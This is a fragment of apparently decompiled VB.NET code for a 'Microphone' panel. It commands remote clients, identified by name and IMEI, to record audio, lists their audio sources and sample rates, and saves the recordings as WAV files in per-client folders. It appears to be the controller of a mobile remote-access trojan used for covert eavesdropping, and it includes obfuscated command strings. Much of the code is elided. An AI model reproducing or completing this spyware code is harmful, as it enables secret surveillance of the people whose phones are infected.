...
Public Class Microphone
    ...
    Private Sub LBAudioSource_Click(ByVal sender As Object, ByVal e As EventArgs) Handles LBAudioSource.Click
        If (Me.SELCT_AS.Items.Count > 0) Then
            ...
            Me.SELCT_AS.Height = Me.SELCT_AS.PreferredSize.Height
    ...
    Public Sub RecordMicrophone()
        'Console.WriteLine("Start Record")
        Me.Record.Text = "Stop Recording"
        Me.Record.Tag = "1"
    ...
    Private Sub Record_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Record.Click
        Try
            If (Not Operators.ConditionalCompareObjectEqual(Me.Record.Tag, "-1", False)) Then
                Me.Record.Tag = "-1"
                Me.Record.Text = "Record"
                Me.Record.Enabled = False
        ...
        Try
            ...
            ElseIf (Operators.CompareString(value, Store.BFF(Store.buff, CLng(84)), False) = 0) Then
                If (Operators.ConditionalCompareObjectEqual(Ay.GetValue(0), "OK", False)) Then
                    Dim strArrays() As String = {"8000", "11025", "22050", "44100"}
                    ...
                    While num < CInt(strArrays1.Length)
                        ...
                        {
                            .Text = String.Concat("Sample Rate:", str),
                    ...
                    While num1 < CInt(strArrays3.Length)
                        ...
                        toolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem() With
                        {
                            .Text = String.Concat("Audio Source:", str1),
                            .Name = String.Concat("m_item", Conversions.ToString(Me.SELCT_SR.Items.Count)),
                            .Tag = str1,
                            .ImageScaling = ToolStripItemImageScaling.None
                        }
    ...
    Public Sub StartRecording()
        'Recording Path Create
        Dim recPath As String = Application.StartupPath & "\Resources\Clients\" + Me.TClient.ClientName + "_" + Me.TClient.ClientImei + "\AudioManager"
        recordPath = recPath
        If Not Directory.Exists(recPath) Then
            Directory.CreateDirectory(recPath)
        End If
        'Recording Path Create

        waveSource.WaveFormat = New NAudio.Wave.WaveFormat(Me.LBSampleRate.Tag, 16, 1)
        ms = New MemoryStream()
    ...
    Private Sub waveSource_RecordingStopped(ByVal sender As Object, ByVal e As Wave.StoppedEventArgs)
        Dim fs As FileStream = File.Create(recordPath & "\Audio_" + DateAndTime.Now.ToString("yyyy-MM-dd_HH.mm.ss") + ".wav")
